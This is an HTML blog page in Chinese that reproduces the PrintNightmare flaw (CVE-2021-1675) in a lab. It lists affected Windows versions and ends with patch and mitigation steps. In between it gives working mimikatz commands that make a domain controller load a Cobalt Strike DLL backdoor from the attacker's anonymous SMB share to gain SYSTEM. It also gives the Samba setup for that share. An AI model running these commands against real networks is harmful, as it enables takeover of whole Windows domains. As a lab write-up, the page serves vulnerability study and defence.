@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="简介6 月 9 日，微软发布 6 月安全更新补丁，修复了 50 个安全漏洞，其中包括一个 Windows Print Spooler 权限提升漏洞，漏洞 CVE 编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。 漏洞描述P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现">
+<meta property="og:url" content="http://example.com/posts/775123418/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="简介6 月 9 日，微软发布 6 月安全更新补丁，修复了 50 个安全漏洞，其中包括一个 Windows Print Spooler 权限提升漏洞，漏洞 CVE 编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。 漏洞描述P">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633325347/1_xjrpok.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633326756/2_oqt82w.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633327942/3_rw4slu.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633327946/4_pnbiju.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633327942/5_ug2c1t.png">
+<meta property="article:published_time" content="2021-08-09T08:46:40.000Z">
+<meta property="article:modified_time" content="2022-03-21T08:24:53.466Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633325347/1_xjrpok.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/400502091/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/1541051201/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/775123418/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/775123418/&text=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/775123418/&is_video=false&description=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现&body=Check out this article: http://example.com/posts/775123418/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/775123418/&name=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/775123418/&t=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">4.1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.2.</span> <span class="toc-text">本地权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.3.</span> <span class="toc-text">域控权限提升</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">5.</span> <span class="toc-text">修复方案</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-09T08:46:40.000Z" itemprop="datePublished">2021-08-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>6 月 9 日，微软发布 6 月安全更新补丁，修复了 50 个安全漏洞，其中包括一个 Windows Print Spooler 权限提升漏洞，漏洞 CVE 编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。</p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Print Spooler 是 Windows 系统中用于管理打印相关事务的服务。</p>
+<p>该漏洞在域环境中合适的条件下，无需任何用户交互，未经身份验证的远程攻击者就可以利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2012 R2(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2012 R2</span><br><span class="line"></span><br><span class="line">Windows Server 2012(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2012</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line"></span><br><span class="line">Windows RT 8.1</span><br><span class="line"></span><br><span class="line">Windows 8.1 for x64-based systems</span><br><span class="line"></span><br><span class="line">Windows 8.1 for 32-bit systems</span><br><span class="line"></span><br><span class="line">Windows 7 for x64-based Systems Service Pack 1</span><br><span class="line"></span><br><span class="line">Windows 7 for 32-bit Systems Service Pack 1</span><br><span class="line"></span><br><span class="line">Windows Server 2016(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2016</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1607 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1607 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows Server, version 20H2(Server Core Installation)</span><br><span class="line"></span><br><span class="line">Windows 10 Version 20H2 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 20H2 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 20H2 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows Server, version 2004(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows 10 Version 2004 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 2004 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 2004 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 21H1 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 21H1 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 21H1 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows Server 2019(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2019</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1809 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1809 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1809 for 32-bit Systems</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>由于博主日常生产环境是 mac，因此使用的是 VM Fusion 部署虚拟机、VM WorkStation 同样可以</p>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、Windows server 2016   </span><br><span class="line"></span><br><span class="line">迅雷下载：ed2k://|file|cn_windows_server_2016_x64_dvd_9718765.iso|6176450560|CF1B73D220F1160DE850D9E1979DBD50|/</span><br><span class="line"></span><br><span class="line">角色：域控  ip：172.16.1.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2、Windows 10 ，Version 1607</span><br><span class="line"></span><br><span class="line">迅雷下载：</span><br><span class="line">ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jul_2016_x64_dvd_9056935.iso|4347183104|35EA5DB0F3BB714F5CE0740FB89D82D1|/</span><br><span class="line"></span><br><span class="line">角色：域内普通主机 ip：172.16.1.2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3、kali  ip：172.16.1.3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4、域内普通用户 test</span><br></pre></td></tr></table></figure>
+
+<p>先用 cs 生成一个 dll 后门文件，Windows Print Spooler 会加载 dll 执行上线</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633325347/1_xjrpok.png"></p>
+<p>Mimikatz 武器化利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gentilkiwi/mimikatz</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地权限提升"><a href="#本地权限提升" class="headerlink" title="本地权限提升"></a>本地权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">misc::printnightmare /library:C:\Users\test\Desktop\mimikatz_trunk\x64\mimispool.dll  /server:172.16.1.2 /authuser:test /authdomain:jhc.cn /authpassword:password</span><br><span class="line">#将mimispool.dll替换成cs生成的dll后门即可以system权限上线</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633326756/2_oqt82w.png"></p>
+<h3 id="域控权限提升"><a href="#域控权限提升" class="headerlink" title="域控权限提升"></a>域控权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">前提条件</span><br><span class="line">1、需要控制域内任意一台满足漏洞利用条件的主机</span><br><span class="line">2、需要一个域内普通账户，并且知道明文密码</span><br><span class="line">3、需要一台机器提供smb匿名访问</span><br></pre></td></tr></table></figure>
+
+<p><strong>域控配置</strong></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633327942/3_rw4slu.png"></p>
+<p>我这里使用 kali 开启 smb 匿名访问，当然用域内被控机开启也是可以的，但是 windows 配置 smb 匿名访问有点问题，玄学</p>
+<p>kali 开启 smb 匿名访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba #安装smb服务</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf #修改smb配置文件添加如下内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">map to guest = Bad User</span><br><span class="line">server role = standalone server</span><br><span class="line">usershare allow guests = yes</span><br><span class="line">idmap config * : backend = tdb</span><br><span class="line">smb ports = 445</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[smb]</span><br><span class="line">comment = Samba</span><br><span class="line">path = /tmp/ #可以修改共享目录，我这里用默认</span><br><span class="line">guest ok = yes</span><br><span class="line">read only = no</span><br><span class="line">browsable = yes</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#重启smb服务</span><br><span class="line">systemctl restart smbd</span><br><span class="line">systemctl restart nmbd</span><br></pre></td></tr></table></figure>
+
+<p>将 dll 后门文件放至 kali 中 tmp 目录下，以便能访问到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc::printnightmare /library:\\172.16.1.3\smb\b.dll  /server:172.16.1.1 /authuser:test /authdomain:jhc.cn /authpassword:password</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633327946/4_pnbiju.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633327942/5_ug2c1t.png"></p>
+<p>无需交互，域控以 system 权限上线</p>
+<p>注意：本地复现建议关闭防火墙和杀毒软件</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>CVE-2021-1675 补丁更新</p>
+<p>目前微软官方已针对支持的系统版本发布了修复 CVE-2021-1675 漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p>
+<p>临时防护措施：</p>
+<p>1、用户可通过停止并禁用 Print Spooler 服务对 CVE-2021-34527 漏洞进行缓解</p>
+<p>步骤如下：</p>
+<p>进入任务管理器，选择 “服务”-&gt;” 打开服务”-&gt;” 选择 Print Spooler”-&gt;” 右键属性”</p>
+<p>启动类型” 选择” 禁用”，并点击” 停止”，关闭服务，点击” 应用” 和” 确定”，使配置生效。</p>
+<p>注：停用此服务将导致打印功能失效。</p>
+<p>2、通过组策略禁用入站远程打印</p>
+<p>运行组策略编辑器（Win+R，输入 gpedit.msc，打开组策略编辑器），依次浏览到：计算机配置 &#x2F; 管理模板 &#x2F; 打印机：禁用 “允许打印后台处理程序接受客户端连接：” 策略以阻止远程攻击。</p>
+<p>注：此策略将通过阻止入站远程打印操作来阻止远程攻击。该系统将不再用作打印服务器，但仍然可以本地打印到直接连接的设备。</p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">4.1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.2.</span> <span class="toc-text">本地权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.3.</span> <span class="toc-text">域控权限提升</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">5.</span> <span class="toc-text">修复方案</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/775123418/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/775123418/&text=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/775123418/&is_video=false&description=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现&body=Check out this article: http://example.com/posts/775123418/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/775123418/&title=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/775123418/&name=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/775123418/&t=CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
